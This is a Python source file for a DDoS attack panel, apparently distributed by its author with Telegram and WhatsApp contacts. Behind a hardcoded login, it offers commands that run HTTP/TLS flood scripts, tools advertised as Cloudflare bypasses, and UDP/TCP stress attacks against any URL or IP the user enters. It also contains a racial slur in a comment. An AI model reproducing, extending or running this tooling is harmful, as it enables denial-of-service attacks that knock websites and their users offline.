
## A NEAT AND FRESH NEW LOOK.             ##
## THIS FILE WAS CLEANING BY LINTAR!  ##
## ITS DDoS PANEL BY LINTAR!                    ##
## TELERAGM: @Lintar21                               ##
## WhatsApp: +6281247891005                  ##

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def lod():
	print('Wait!')

def atas():
	sys.stdout.write(f"\x1b]2; IRazz--> Stars: [{bots}] | Online Users: [THE LEAST] | Methods: [UNLIMITED] | Bypass: [UNLIMITED]\x07")
	print('                  IRazz Panel Owner By IRazz')
	print('                  ProxyFile Name : proxy.txt')
	print("")

def logo():
	clear()
	atas()
	print(""" 
 ██▓ ██▀███   ▄▄▄      ▒███████▒▒███████▒   
▓██▒▓██ ▒ ██▒▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░   
▒██▒▓██ ░▄█ ▒▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░    
░██░▒██▀▀█▄  ░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░   
░██░░██▓ ▒██▒ ▓█   ▓██▒▒███████▒▒███████▒   
░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   
 ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒   
 ▒ ░  ░░   ░   ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░   
 ░     ░           ░  ░  ░ ░      ░ ░       
                       ░        ░           
Type [Help]
 """)
	
def methods():
	clear()
	logo()
	print("""
-» Layer 7
    -» Powerfull Method
        BAD: is the strongest² DDoS attack method in ITsApi
        BRUN: This DDoS Attack method will burn down the web !
        404: DDoS Attacks That Make Web Error 404 not found
        TLS: TLS Method 
        
    -» Mixed Method
        MIX: Mixed Methods All Http/Https And Etc..
        CFS: CloudflareUam-Strong Bypassing 
        
    -» Basic Method
        FLOOD: Flood web by method get

    -» Bypass Method
        CF: CloudFlare Bypassing 
        CFV2: CloudFlare Bypassing v2

-» Layer 4
    -» All Method L4
        STRESS: Stresser Method DDos UDP/TCP/HTTP
        
-» TOOLS
    -» ALL TOOLS
        PAPING: Paping A Web
        PROXY: Proxy Scrape
""")

def main():
    logo()
    while(True):
        cnc = input('''@IRazz\n ==>''')
        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
            methods()
        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
		
# LAYER 7 METHODS

# LAYER 7 POWERFUL METHOD [ VVIP ]

        elif "TLS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && node TLS0POWERFULL.js {target} 443 {time} 512 10')
            except IndexError:
                print('Usage:  TLS <url> <time>')
                print('Example: TLS http://example.com 60')

        elif "BRUN" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && go run httpflood.go {url} 10 get {time} nil')
                os.system(f'cd L7 && node LIN.js GET {url} proxy.txt {time} 64 10')
                os.system(f'cd L7 && node BOT.js {url} {time} 64 10 proxy.txt')
                os.system(f'cd L7 && node 404.js {url} {time} 64 10 proxy.txt')
            except IndexError:
                print('Usage: HTTP <url> <time>')
                print('Example: HTTP http://example.com 60')

        elif "BAD" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && node TLS0POWERFULL.js {target} 443 {time} 512 10')
                os.system(f'cd L7 && node TLSVIP.js {target} {time} 512 10')
                os.system(f'cd L7 && node MIX.js {target} 10 {time}')
                os.system(f'cd L7 && node TLS.js {target} {time} 512 10')
                os.system(f'cd L7 && node UAM.js {target} {time} 512 10 proxy.txt')
                os.system(f'cd L7 && node UAMV2.js {target} {time} 512 10 proxy.txt')
                os.system(f'cd L7 && node TLSv2.js {target} {time} 512 10 proxy.txt')
                os.system(f'cd L7 && node TLSv1.js {target} {time} 512 10')
            except IndexError:
                print('Usage: BAD <url> <time>')
                print('Example: BAD <http://example.com>')

# MIXED METHOD

        elif "CFS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && node MIX.js {target} 10 {time}')
                os.system(f'cd L7 && node UAM.js {target} {time} 512 10 proxy.txt')
                os.system(f'cd L7 && node UAMV2.js {target} {time} 512 10 proxy.txt')
            except IndexError:
                print('Usage: CFS <url> <time>')
                print('Example: CFS http://example.com 60')

        elif "MIX" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && node MIX.js {target} 10 {time}')
                os.system(f'cd L7 && node TLS0POWERFULL.js {target} 443 {time} 512 10')
            except IndexError:
                print('Usage: MIX <url> <time>')
                print('Example: MIX example.com 60')

# BYPASS METHOD 

        elif "CFV2" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && node UAMV2.js {target} {time} 512 10 proxy.txt')
            except IndexError:
                print('Usage: CFV2 <url> <time>')
                print('Example: CFV2 example.com 60')

        elif "CF" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && node UAM.js {target} {time} 512 10 proxy.txt')
            except IndexError:
                print('Usage: CF <url> <time>')
                print('Example: CF  http://example.com 60')

# LAYER 7 BASIC METHOD 

        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'cd L7 && go run httpflood.go {url} 10 get {time} nil')
            except IndexError:
                print('Usage: FLOOD <url> <time>')
                print('Example: FLOOD http://example.com 60')

# LAYER 4 METHODS

        elif "STRESS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'cd L4 && go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: STRESS <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
        elif "UDP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'cd L4 && python3 STRL4.py {ip} {port} {time}')
            except IndexError:
                print('Usage: UDP2 <ip> <port> <time>')
                print('Example: UDP2 4 1.1.1.1 443 120')

# TOOLS

        elif "PAPING" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 paping.py {ip} {port}')
            except IndexError:
                print('Usage: paping <ip> <port> <time>')
                print('Example: paping 1.1.1.1 443 120')

        elif "PROXY" in cnc:
            try:
                os.system(f'python3 scrape.py')
            except IndexError:
                print('Usage: PROXY')
                print('Example: PROXY')
                
#only niggs dont understand
        elif "HELP" in cnc:
            print(f'''         
» Methods : To show methods 
» Clear: To clear all messages
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                

# LOG-IN

def login():
    clear()
    user = "IRazz"
    passwd = "1"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to ITs DDoS Panel!!!...")
        time.sleep(0.3)
        main()

login()
